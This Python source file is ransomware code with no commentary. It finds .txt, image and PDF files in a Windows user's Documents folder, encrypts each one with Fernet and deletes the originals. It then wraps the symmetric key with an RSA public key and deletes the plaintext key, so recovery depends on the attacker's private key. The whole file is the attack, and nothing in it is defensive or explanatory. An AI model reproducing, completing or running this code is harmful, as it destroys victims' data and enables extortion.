import os
from cryptography.fernet import Fernet
import rsa
import base64


file_extensions=[".txt",'.png','jpg','pdf']

def rand_key_save(rand_key):
    with open("encryption_key.key","wb") as ekey:
        ekey.write(rand_key)

def file_finder():
    username = os.getlogin()
    path = f'C:/Users/{username}/Documents'
    files = os.listdir(path)
    file_names = []
    files_full_path = []
    for f in files:
        for j in file_extensions:
            if j in f:
                files_full_path.append(f"{path}/{f}")
                file_names.append(f)
    return path, file_names

def key_encryptor(ekey):
    with open('public.pem', 'rb') as p:
            publicKey = rsa.PublicKey.load_pkcs1(p.read())
    encrypted_key = rsa.encrypt(ekey, publicKey)
    encoded_ekey = base64.b64encode(encrypted_key).decode('utf-8')
    with open("encrypted_key.ekey","w") as ek:
        ek.write(encoded_ekey)
    os.remove("encryption_key.key")

def file_encryptor(ekey):
    fernet_enc=Fernet(ekey)
    path, file_names=file_finder()
    for file in file_names:
        with open (f"{path}/{file}", 'rb') as original_file:
            origin_data=original_file.read()
        with open(f'{path}/encrypted-{file}-.enctd', 'wb') as enc_file:
            enc_file.write(fernet_enc.encrypt(origin_data))
        os.remove(f"{path}/{file}")

